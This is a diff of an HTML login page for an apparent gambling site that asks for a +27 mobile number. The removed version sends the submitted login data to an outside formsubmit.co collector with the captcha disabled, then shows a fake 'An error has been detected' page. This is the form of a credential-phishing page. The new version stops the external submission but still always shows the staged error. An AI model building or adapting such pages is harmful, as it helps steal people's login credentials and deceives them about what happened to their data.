@@ -18,13 +18,10 @@
     </div>
   </div>
 
-  <!-- Login Form Page -->
-  <div class="container" id="form-page">
+  <!-- Form Section -->
+  <div class="container" id="form-section">
     <h2>Login</h2>
-    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="?error=1">
-
+    <form id="login-form">
       <label for="mobile">Mobile Number</label>
       <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
@@ -41,10 +38,10 @@
     </div>
   </div>
 
-  <!-- Error Page (Hidden by default) -->
-  <div class="container" id="error-page" style="display: none;">
-    <h2 style="text-align: center; color: red;">An error has been detected</h2>
-    <p style="text-align: center;">Please try again later.</p>
+  <!-- Error Message (Initially hidden) -->
+  <div class="container" id="error-message" style="display: none;">
+    <h2 style="text-align:center; color: red;">An error has been detected</h2>
+    <p style="text-align:center;">Please try again later.</p>
   </div>
 
   <!-- Disclaimer -->
@@ -57,14 +54,15 @@
     Gambling on this website, you run the risk that you may lose.
   </div>
 
-  <!-- Script to show error page -->
+  <!-- Script to block real submission and show error -->
   <script>
-    const params = new URLSearchParams(window.location.search);
-    if (params.get("error") === "1") {
-      document.getElementById("form-page").style.display = "none";
-      document.getElementById("error-page").style.display = "block";
-    }
+    const form = document.getElementById("login-form");
+    form.addEventListener("submit", function(event) {
+      event.preventDefault(); // stop real submission
+      document.getElementById("form-section").style.display = "none";
+      document.getElementById("error-message").style.display = "block";
+    });
   </script>
 
 </body>
-  </html>
+</html>
